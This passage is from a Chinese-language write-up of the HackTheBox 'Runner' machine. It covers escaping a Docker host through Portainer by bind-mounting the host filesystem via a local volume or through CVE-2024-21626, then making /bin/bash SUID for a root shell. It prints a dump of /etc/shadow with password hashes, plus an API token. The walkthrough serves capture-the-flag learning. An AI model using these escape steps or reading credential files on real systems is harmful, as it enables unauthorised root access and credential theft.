eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJtYXR0aGV3Iiwicm9sZSI6Miwic2NvcGUiOiJkZWZhdWx0IiwiZm9yY2VDaGFuZ2VQYXNzd29yZCI6ZmFsc2UsImV4cCI6MTcxMzY3OTE2NiwiaWF0IjoxNzEzNjUwMzY2fQ.hIoo_mOx76S91KsFGTW_Cd5MjzMo3StCtuqoE3HMM_w&quot;</span> \</span><br><span class="line">name==<span class="string">&quot;web01&quot;</span> Image=<span class="string">&quot;ubuntu:latest&quot;</span> \</span><br><span class="line">ExposedPorts:=<span class="string">&#x27;&#123; &quot;80/tcp&quot;: &#123;&#125; &#125;&#x27;</span> \</span><br><span class="line">HostConfig:=<span class="string">&#x27;&#123; &quot;Binds&quot;: [ &quot;/:/mane&quot; ] &#125;&#x27;</span></span><br><span class="line">HTTP/1.1 403 Forbidden</span><br><span class="line">Content-Length: 105</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Date: Sat, 20 Apr 2024 22:05:23 GMT</span><br><span class="line">X-Content-Type-Options: nosniff</span><br><span class="line">X-Xss-Protection: 1; mode=block</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;details&quot;</span>: <span class="string">&quot;forbidden to use bind mounts&quot;</span>,</span><br><span class="line">    <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Unable to proxy the request via the Docker socket&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是使用API遇到 <code>forbidden to use bind mounts</code>​，也就是說 <code>Portainer</code>​ 會嘗試檢查你的payload。</p>
+<h2 id="0x7-非預期提權"><a href="#0x7-非預期提權" class="headerlink" title="0x7 非預期提權"></a>0x7 非預期提權</h2><p>根據這篇文檔：<a target="_blank" rel="noopener" href="https://forums.docker.com/t/create-local-volume-with-custom-mount-options/117924">https://forums.docker.com/t/create-local-volume-with-custom-mount-options/117924</a></p>
+<p>其實可以嘗試用web增加一些參數：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">volumes:</span><br><span class="line">  my_volume:</span><br><span class="line">    driver: <span class="built_in">local</span></span><br><span class="line">    driver_opts:</span><br><span class="line">      <span class="built_in">type</span>: none</span><br><span class="line">      device: <span class="string">&quot;/path/to/your/host/dir&quot;</span></span><br><span class="line">      o: <span class="built_in">bind</span></span><br></pre></td></tr></table></figure>
+
+<p>換句話説可以新建一個 volumes ， 使用 local driver 的參數就可以指定你想綁定到哪裏：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421224830-hqffsp6.png" alt="image">​</p>
+<p>之後點了保存，會直接顯示成功：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421224843-bnd6xv9.png" alt="image">​</p>
+<p>然後去新建容器：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421225039-5oiz55x.png" alt="image">​</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421225023-rldi1dp.png" alt="image">​</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421225028-hh2s3x2.png" alt="image">​</p>
+<p>弄好之後進去挂載的路徑：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421225205-dibq3qq.png" alt="image">​</p>
+<p>經典的操作，然後得到root。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">john@runner:~$ <span class="built_in">ls</span> -la /bin/bash</span><br><span class="line">-rwsrwxrwx 1 root root 1396520 Mar 14 11:31 /bin/bash</span><br><span class="line">john@runner:~$ bash -p</span><br><span class="line">bash-5.1<span class="comment"># </span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x7-可能是預期的提權"><a href="#0x7-可能是預期的提權" class="headerlink" title="0x7 可能是預期的提權"></a>0x7 可能是預期的提權</h2><p>最近出了一個CVE 是關於 docker 的：<a target="_blank" rel="noopener" href="https://nitroc.org/en/posts/cve-2024-21626-illustrated/">https://nitroc.org/en/posts/cve-2024-21626-illustrated/</a></p>
+<p>根據提示只需要設置 working dir 就可以提權：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421233011-vhme3xk.png" alt="image">​</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421233036-tilirzq.png" alt="image">​</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421233121-3eiinrj.png" alt="image">​</p>
+<p>然後你就可以任意的修改文件：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421233624-9tbaq80.png" alt="image">​</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-vi9W9Vqct6q3BLb2-Runner/image-20240421233642-j7qwdxb.png" alt="image">​</p>
+<p>同樣的，修改裏面的 &#x2F;bin&#x2F;bash 為 4777 你就得到了shell。</p>
+<p>‍</p>
+<h2 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">bash-5.1<span class="comment"># cat /etc/shadow</span></span><br><span class="line">root:$y$j9T<span class="variable">$ANKO0Lgp1HOfm5nPIRoTX</span>.<span class="variable">$S4tkxOzaYLCUAy8deQR</span>/4sayinxeXoQb.nGRDMGUa30:19788:0:99999:7:::</span><br><span class="line">daemon:*:19405:0:99999:7:::</span><br><span class="line">bin:*:19405:0:99999:7:::</span><br><span class="line">sys:*:19405:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:19405:0:99999:7:::</span><br><span class="line">games:*:19405:0:99999:7:::</span><br><span class="line">man:*:19405:0:99999:7:::</span><br><span class="line">lp:*:19405:0:99999:7:::</span><br><span class="line">mail:*:19405:0:99999:7:::</span><br><span class="line">news:*:19405:0:99999:7:::</span><br><span class="line">uucp:*:19405:0:99999:7:::</span><br><span class="line">proxy:*:19405:0:99999:7:::</span><br><span class="line">www-data:*:19405:0:99999:7:::</span><br><span class="line">backup:*:19405:0:99999:7:::</span><br><span class="line">list:*:19405:0:99999:7:::</span><br><span class="line">irc:*:19405:0:99999:7:::</span><br><span class="line">gnats:*:19405:0:99999:7:::</span><br><span class="line">nobody:*:19405:0:99999:7:::</span><br><span class="line">_apt:*:19405:0:99999:7:::</span><br><span class="line">systemd-network:*:19405:0:99999:7:::</span><br><span class="line">systemd-resolve:*:19405:0:99999:7:::</span><br><span class="line">messagebus:*:19405:0:99999:7:::</span><br><span class="line">systemd-timesync:*:19405:0:99999:7:::</span><br><span class="line">pollinate:*:19405:0:99999:7:::</span><br><span class="line">sshd:*:19405:0:99999:7:::</span><br><span class="line">syslog:*:19405:0:99999:7:::</span><br><span class="line">uuidd:*:19405:0:99999:7:::</span><br><span class="line">tcpdump:*:19405:0:99999:7:::</span><br><span class="line">tss:*:19405:0:99999:7:::</span><br><span class="line">landscape:*:19405:0:99999:7:::</span><br><span class="line">fwupd-refresh:*:19405:0:99999:7:::</span><br><span class="line">usbmux:*:19474:0:99999:7:::</span><br><span class="line">lxd:!:19474::::::</span><br><span class="line">matthew:$y$j9T<span class="variable">$VcVx4oj6</span>/0sr8ldYLVrdx1<span class="variable">$xNznv</span>.vvbyLEM8S6/YKAfPHP6hoYg3oD1MWRNovVlx/:19781:0:99999:7:::</span><br><span class="line">john:$y$j9T$rpK6N7DunMYlKLZJcOzCY1<span class="variable">$lcPx9lbvGZBnn7ip</span>/qQDho2NCF/UsOmYc1P2Ve/y6F2:19781:0:99999:7:::</span><br><span class="line">_laurel:!:19817::::::</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h2 id="0xA1-More-and-more"><a href="#0xA1-More-and-more" class="headerlink" title="0xA1 More and more"></a>0xA1 More and more</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">bash-5.1<span class="comment"># ss -tlunp</span></span><br><span class="line">Netid      State       Recv-Q      Send-Q           Local Address:Port           Peer Address:Port     Process                                                                            </span><br><span class="line">udp        UNCONN      0           0                127.0.0.53%lo:53                  0.0.0.0:*         <span class="built_in">users</span>:((&quot;systemd-resolve&quot;,pid=<span class="number">607</span>,fd=<span class="number">13</span>))                                         </span><br><span class="line">udp        UNCONN      0           0                      0.0.0.0:68                  0.0.0.0:*         <span class="built_in">users</span>:((&quot;dhclient&quot;,pid=<span class="number">751</span>,fd=<span class="number">9</span>))                                                 </span><br><span class="line">tcp        LISTEN      0           4096                 127.0.0.1:8111                0.0.0.0:*         <span class="built_in">users</span>:((&quot;docker-proxy&quot;,pid=<span class="number">1363</span>,fd=<span class="number">4</span>))                                            </span><br><span class="line">tcp        LISTEN      0           128                    0.0.0.0:22                  0.0.0.0:*         <span class="built_in">users</span>:((&quot;sshd&quot;,pid=<span class="number">1016</span>,fd=<span class="number">3</span>))                                                    </span><br><span class="line">tcp        LISTEN      0           511                    0.0.0.0:80                  0.0.0.0:*         <span class="built_in">users</span>:((&quot;nginx&quot;,pid=<span class="number">1045</span>,fd=<span class="number">6</span>),(&quot;nginx&quot;,pid=<span class="number">1044</span>,fd=<span class="number">6</span>),(&quot;nginx&quot;,pid=<span class="number">1043</span>,fd=<span class="number">6</span>))   </span><br><span class="line">tcp        LISTEN      0           4096                 127.0.0.1:9443                0.0.0.0:*         <span class="built_in">users</span>:((&quot;portainer&quot;,pid=<span class="number">995</span>,fd=<span class="number">10</span>))                                               </span><br><span class="line">tcp        LISTEN      0           4096                 127.0.0.1:5005                0.0.0.0:*         <span class="built_in">users</span>:((&quot;docker-proxy&quot;,pid=<span class="number">1376</span>,fd=<span class="number">4</span>))                                            </span><br><span class="line">tcp        LISTEN      0           4096                 127.0.0.1:9000                0.0.0.0:*         <span class="built_in">users</span>:((&quot;portainer&quot;,pid=<span class="number">995</span>,fd=<span class="number">9</span>))                                                </span><br><span class="line">tcp        LISTEN      0           4096             127.0.0.53%lo:53                  0.0.0.0:*         <span class="built_in">users</span>:((&quot;systemd-resolve&quot;,pid=<span class="number">607</span>,fd=<span class="number">14</span>))                                         </span><br><span class="line">tcp        LISTEN      0           128                       [::]:22                     [::]:*         <span class="built_in">users</span>:((&quot;sshd&quot;,pid=<span class="number">1016</span>,fd=<span class="number">4</span>))                                                    </span><br><span class="line">tcp        LISTEN      0           511                       [::]:80                     [::]:*         <span class="built_in">users</span>:((&quot;nginx&quot;,pid=<span class="number">1045</span>,fd=<span class="number">7</span>),(&quot;nginx&quot;,pid=<span class="number">1044</span>,fd=<span class="number">7</span>),(&quot;nginx&quot;,pid=<span class="number">1043</span>,fd=<span class="number">7</span>))   </span><br><span class="line">tcp        LISTEN      0           4096                         *:8000                      *:*         <span class="built_in">users</span>:((&quot;portainer&quot;,pid=<span class="number">995</span>,fd=<span class="number">8</span>))  </span><br></pre></td></tr></table></figure>
+
+<p>原來8000端口是portainer 而不是chisel。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bash-5.1<span class="comment"># docker ps -a</span></span><br><span class="line">CONTAINER ID   IMAGE           COMMAND                  CREATED         STATUS                   PORTS                                                NAMES</span><br><span class="line">7d10533d0a67   ubuntu:latest   <span class="string">&quot;/bin/bash&quot;</span>              8 minutes ago   Up 8 minutes                                                                  sleepisgood</span><br><span class="line">c299a54b6210   e8d6e333e0ed    <span class="string">&quot;/bin/sh -c &#x27;cd ../.?&quot;</span>   2 weeks ago     Created                                                                       awesome_davinci</span><br><span class="line">dc7e949b21a2   e8d6e333e0ed    <span class="string">&quot;/bin/sh -c &#x27;cd ../.?&quot;</span>   2 weeks ago     Exited (1) 2 weeks ago                                                        adoring_jennings</span><br><span class="line">980158ede4e4   e8d6e333e0ed    <span class="string">&quot;/bin/sh -c &#x27;cd ../.?&quot;</span>   2 weeks ago     Exited (1) 2 weeks ago                                                        great_hofstadter</span><br><span class="line">647a82f29ca0   e23afbc992ab    <span class="string">&quot;/run-services.sh&quot;</span>       7 weeks ago     Up 2 hours               127.0.0.1:5005-&gt;5005/tcp, 127.0.0.1:8111-&gt;8111/tcp   kind_leavitt</span><br></pre></td></tr></table></figure>
+
+<h1 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h1><p><strong>Respect</strong>: If my writeup really helps you, <a target="_blank" rel="noopener" href="https://app.hackthebox.com/users/463126">Give me a respect</a> to let me know， Thankssssss!</p>
+<p><strong>感謝</strong>: 製作不易，如果我的writeup真的幫到你了, <a target="_blank" rel="noopener" href="https://app.hackthebox.com/users/463126">給我一個respect</a>，這樣我就會知道，感謝你！</p>
+
+    <iframe src="/maneplugin/badge/htb.html" style="border:none; height: 70px" title="description"></iframe>
+
+
+<p><strong>Beginner Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">If you are a beginner, please use this link to sign up for an HTB Academy to get more Higher level of knowledge.</a></p>
+<p><strong>新手非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">如果你是初學者，可以用此鏈接來嘗試注冊 HTB Academy 賬號。</a></p>
+<p>使用上面的鏈接加入 HTB 的 academy 就可以免費看 Tire 0 的所有教程，這對初學者來説是很友好的。 （建議先完成 INTRODUCTION TO ACADEMY）</p>
+<p>Join HTB’s academy with this link to get free access to all the tutorials for Tire 0. This is very beginner friendly. (It is recommended to complete INTRODUCTION TO ACADEMY first)</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <script>
+        setTimeout(() => {
+          makeList({
+             'target': '#toc-mobile',   // Selector for element to place table of contents
+             'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+          });
+        }, 1000);
+      </script>
+    
+    <div id="toc-footer" style="display: none">
+      <div id="toc-mobile"></div>
+    </div>
+
+    <style>
+        #toc-mobile {
+        }
+        #toc-mobile ul {
+           display: grid ! important;
+        }
+        #toc-mobile li {
+           margin: 0 0 0 0 ! important;
+        }
+        #toc-mobile .level-1 {
+           color: #00b4dd ;
+        }
+        #toc-mobile .level-2 {
+           color: #2bbc8a;
+        }
+        #toc-mobile .level-3 {
+           color: #40474b;
+        }
+        #toc-mobile .level-4 .level-5 .level-6 {
+           color: #8c8c8c;
+        }
+    </style>
+
+
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/04/21/2024-htb-machine/15-Runner/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/04/21/2024-htb-machine/15-Runner/&text=HackTheBox - Machine - Runner"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/04/21/2024-htb-machine/15-Runner/&title=HackTheBox - Machine - Runner"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/04/21/2024-htb-machine/15-Runner/&is_video=false&description=HackTheBox - Machine - Runner"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - Runner&body=Check out this article: https://manesec.github.io/2024/04/21/2024-htb-machine/15-Runner/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/04/21/2024-htb-machine/15-Runner/&title=HackTheBox - Machine - Runner"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/04/21/2024-htb-machine/15-Runner/&title=HackTheBox - Machine - Runner"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/04/21/2024-htb-machine/15-Runner/&title=HackTheBox - Machine - Runner"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/04/21/2024-htb-machine/15-Runner/&title=HackTheBox - Machine - Runner"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/04/21/2024-htb-machine/15-Runner/&name=HackTheBox - Machine - Runner&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/04/21/2024-htb-machine/15-Runner/&t=HackTheBox - Machine - Runner"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+      
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+  
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    manesec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- Add space -->
+<script src="https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    // listen to any DOM change and automatically perform spacing via MutationObserver()
+    pangu.autoSpacingPage();
+  });
+</script>
+
+<!-- fancybox support -->
+
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
